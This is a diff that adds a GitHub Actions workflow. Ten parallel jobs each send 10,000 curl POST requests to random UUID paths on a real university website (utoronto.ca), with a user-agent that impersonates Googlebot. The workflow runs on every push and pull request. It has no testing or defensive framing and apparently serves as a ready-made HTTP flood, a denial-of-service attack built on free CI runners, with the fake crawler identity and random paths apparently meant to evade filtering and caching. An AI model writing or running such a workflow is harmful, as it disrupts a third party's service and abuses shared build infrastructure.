@@ -1,0 +1,208 @@
+name: Run Commands
+env:
+    num1: 10000         
+    UA: "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.66 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"  
+    METHOD: "POST"     
+    URL: "https://www.utoronto.ca" 
+on:
+  push:
+    branches:
+      - main
+  pull_request:
+    branches:
+      - main
+
+jobs:
+  run-commands-1:
+    runs-on: ubuntu-latest
+
+    
+    steps:
+    - name: Checkout code
+      uses: actions/checkout@v2
+
+    - name: Update APT and install uuid-runtime
+      run: |
+        sudo apt-get update
+        sudo apt-get install uuid-runtime -y
+
+    - name: Run curl commands
+      run: |
+        for i in $(seq 1 $num1); do
+          curl -I -H "user-agent:$UA" -X$METHOD "$URL/$(uuidgen)"
+        done
+        echo "First job ran successfully"
+        
+  run-commands-2:
+    runs-on: ubuntu-latest
+
+    
+    steps:
+    - name: Checkout code
+      uses: actions/checkout@v2
+
+    - name: Update APT and install uuid-runtime
+      run: |
+        sudo apt-get update
+        sudo apt-get install uuid-runtime -y
+
+    - name: Run curl commands
+      run: |
+        for i in $(seq 1 $num1); do
+          curl -I -H "user-agent:$UA" -X$METHOD "$URL/$(uuidgen)"
+        done
+        echo "Second job ran successfully"
+        
+  run-commands-3:
+    runs-on: ubuntu-latest
+
+    
+    steps:
+    - name: Checkout code
+      uses: actions/checkout@v2
+
+    - name: Update APT and install uuid-runtime
+      run: |
+        sudo apt-get update
+        sudo apt-get install uuid-runtime -y
+
+    - name: Run curl commands
+      run: |
+        for i in $(seq 1 $num1); do
+          curl -I -H "user-agent:$UA" -X$METHOD "$URL/$(uuidgen)"
+        done
+        echo "Third job ran successfully"
+
+  run-commands-4:
+    runs-on: ubuntu-latest
+
+    steps:
+    - name: Checkout code
+      uses: actions/checkout@v2
+
+    - name: Update APT and install uuid-runtime
+      run: |
+        sudo apt-get update
+        sudo apt-get install uuid-runtime -y
+
+    - name: Run curl commands
+      run: |
+        for i in $(seq 1 $num1); do
+          curl -I -H "user-agent:$UA" -X$METHOD "$URL/$(uuidgen)"
+        done
+        echo "Fourth job ran successfully"
+        
+  run-commands-5:
+    runs-on: ubuntu-latest
+
+    steps:
+    - name: Checkout code
+      uses: actions/checkout@v2
+
+    - name: Update APT and install uuid-runtime
+      run: |
+        sudo apt-get update
+        sudo apt-get install uuid-runtime -y
+
+    - name: Run curl commands
+      run: |
+        for i in $(seq 1 $num1); do
+          curl -I -H "user-agent:$UA" -X$METHOD "$URL/$(uuidgen)"
+        done
+        echo "Fourth job ran successfully"
+  
+  run-commands-6:
+    runs-on: ubuntu-latest
+
+    steps:
+    - name: Checkout code
+      uses: actions/checkout@v2
+
+    - name: Update APT and install uuid-runtime
+      run: |
+        sudo apt-get update
+        sudo apt-get install uuid-runtime -y
+
+    - name: Run curl commands
+      run: |
+        for i in $(seq 1 $num1); do
+          curl -I -H "user-agent:$UA" -X$METHOD "$URL/$(uuidgen)"
+        done
+        echo "Fourth job ran successfully"
+
+  run-commands-7:
+    runs-on: ubuntu-latest
+
+    steps:
+    - name: Checkout code
+      uses: actions/checkout@v2
+
+    - name: Update APT and install uuid-runtime
+      run: |
+        sudo apt-get update
+        sudo apt-get install uuid-runtime -y
+
+    - name: Run curl commands
+      run: |
+        for i in $(seq 1 $num1); do
+          curl -I -H "user-agent:$UA" -X$METHOD "$URL/$(uuidgen)"
+        done
+        echo "Fourth job ran successfully"
+
+  run-commands-8:
+    runs-on: ubuntu-latest
+
+    steps:
+    - name: Checkout code
+      uses: actions/checkout@v2
+
+    - name: Update APT and install uuid-runtime
+      run: |
+        sudo apt-get update
+        sudo apt-get install uuid-runtime -y
+
+    - name: Run curl commands
+      run: |
+        for i in $(seq 1 $num1); do
+          curl -I -H "user-agent:$UA" -X$METHOD "$URL/$(uuidgen)"
+        done
+        echo "Fourth job ran successfully"
+
+  run-commands-9:
+    runs-on: ubuntu-latest
+
+    steps:
+    - name: Checkout code
+      uses: actions/checkout@v2
+
+    - name: Update APT and install uuid-runtime
+      run: |
+        sudo apt-get update
+        sudo apt-get install uuid-runtime -y
+
+    - name: Run curl commands
+      run: |
+        for i in $(seq 1 $num1); do
+          curl -I -H "user-agent:$UA" -X$METHOD "$URL/$(uuidgen)"
+        done
+        echo "Fourth job ran successfully"
+
+  run-commands-10:
+    runs-on: ubuntu-latest
+
+    steps:
+    - name: Checkout code
+      uses: actions/checkout@v2
+
+    - name: Update APT and install uuid-runtime
+      run: |
+        sudo apt-get update
+        sudo apt-get install uuid-runtime -y
+
+    - name: Run curl commands
+      run: |
+        for i in $(seq 1 $num1); do
+          curl -I -H "user-agent:$UA" -X$METHOD "$URL/$(uuidgen)"
+        done
+        echo "Fourth job ran successfully"
+    
